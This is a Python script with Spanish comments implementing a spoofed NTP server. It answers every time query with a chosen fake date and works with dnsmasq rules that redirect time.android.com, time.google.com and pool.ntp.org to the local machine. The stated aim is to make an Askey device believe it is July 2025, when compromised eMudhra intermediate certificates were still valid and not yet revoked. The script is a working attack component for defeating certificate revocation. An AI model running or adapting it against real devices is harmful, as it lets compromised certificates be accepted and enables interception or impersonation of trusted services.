#!/usr/bin/env python3
"""
ntp_server.py — Servidor NTP con fecha especifica que responde con una fecha específica.

Controla el reloj del dispositivo Askey para que crea estar en una fecha
donde los certificados eMudhra comprometidos eran válidos y no revocados.

USO:
  sudo python3 ntp_spoof.py                    # Default: 1 julio 2025
  sudo python3 ntp_spoof.py --date 2025-07-01  # Fecha específica
  sudo python3 ntp_spoof.py --date 2025-05-15  # Justo después de creación del intermediario

REQUISITOS:
  - Puerto 123/UDP libre (parar systemd-timesyncd o ntpd)
  - dnsmasq redirigiendo time.android.com, time.google.com, pool.ntp.org → 10.42.0.1
"""

import argparse, socket, struct, time, sys, datetime

NTP_EPOCH = 2208988800  # segundos entre 1 Jan 1900 y 1 Jan 1970


def datetime_to_ntp(dt):
    """Convierte datetime a timestamp NTP (segundos desde 1 Jan 1900)."""
    unix_ts = dt.timestamp()
    return int(unix_ts + NTP_EPOCH)


def build_ntp_response(data, fake_ntp_ts):
    """Construye un paquete NTP de respuesta con el timestamp falso."""
    # Extraer datos del request
    if len(data) < 48:
        return None

    # Responder con la misma version NTP del cliente
    client_vn = (data[0] >> 3) & 0x7 if len(data) > 0 else 4
    li_vn_mode = (0 << 6) | (client_vn << 3) | 4   # LI=0, VN=client, Mode=4 (server)
    stratum = 2
    poll = data[2] if len(data) > 2 else 6
    precision = -20  # log2(precision) = 2^-20 s ≈ 1 µs

    response = struct.pack('!BBBb', li_vn_mode, stratum, poll, precision)
    response += struct.pack('!I', 0)          # Root Delay
    response += struct.pack('!I', 0)          # Root Dispersion
    response += b'LOCL'                       # Reference ID (local clock)
    response += struct.pack('!II', fake_ntp_ts, 0)  # Reference Timestamp

    # Origin Timestamp = client's Transmit Timestamp
    if len(data) >= 48:
        response += data[40:48]  # Copy client's transmit as origin
    else:
        response += struct.pack('!II', 0, 0)

    response += struct.pack('!II', fake_ntp_ts, 0)  # Receive Timestamp
    response += struct.pack('!II', fake_ntp_ts, 0)  # Transmit Timestamp

    return response


def main():
    parser = argparse.ArgumentParser(description="Servidor NTP — fecha falsa para el dispositivo")
    parser.add_argument("--date", default="2025-07-01",
                        help="Fecha a servir (YYYY-MM-DD). Default: 2025-07-01")
    parser.add_argument("--port", type=int, default=123)
    parser.add_argument("--bind", default="0.0.0.0")
    args = parser.parse_args()

    try:
        target_dt = datetime.datetime.strptime(args.date, "%Y-%m-%d")
        target_dt = target_dt.replace(hour=12, minute=0, second=0)
    except ValueError:
        print(f"ERROR: Fecha inválida: {args.date} (usar YYYY-MM-DD)")
        sys.exit(1)

    fake_ntp_ts = datetime_to_ntp(target_dt)

    print()
    print("═" * 50)
    print("  NTP SERVER")
    print("═" * 50)
    print(f"  Fecha falsa: {target_dt.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  NTP timestamp: {fake_ntp_ts}")
    print(f"  Escuchando: {args.bind}:{args.port}/udp")
    print()
    print("  Por qué esta fecha:")
    print("    - Intermediario eMudhra creado: 30 abril 2025")
    print("    - Revocación: 18 octubre 2026")
    print("    - Julio 2025 = dentro de validez, pre-revocación")
    print()
    print("  DNS requerido (ya en dnsmasq_extra.conf):")
    print("    address=/time.android.com/10.42.0.1")
    print("    address=/time.google.com/10.42.0.1")
    print("    address=/pool.ntp.org/10.42.0.1")
    print()
    print("  Esperando queries NTP...")
    print("─" * 50)
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind((args.bind, args.port))
    except PermissionError:
        print("ERROR: Necesitas root para usar el puerto 123")
        print("  sudo python3 ntp_spoof.py")
        sys.exit(1)
    except OSError as e:
        print(f"ERROR: {e}")
        print("  Parar el servicio NTP: sudo systemctl stop systemd-timesyncd")
        sys.exit(1)

    try:
        while True:
            data, addr = sock.recvfrom(1024)
            response = build_ntp_response(data, fake_ntp_ts)
            if response:
                sock.sendto(response, addr)
                ts = datetime.datetime.now().strftime("%H:%M:%S")
                print(f"  [{ts}] NTP query de {addr[0]}:{addr[1]} → respondido con {args.date}")
    except KeyboardInterrupt:
        print("\nDetenido.")
    finally:
        sock.close()


if __name__ == "__main__":
    main()
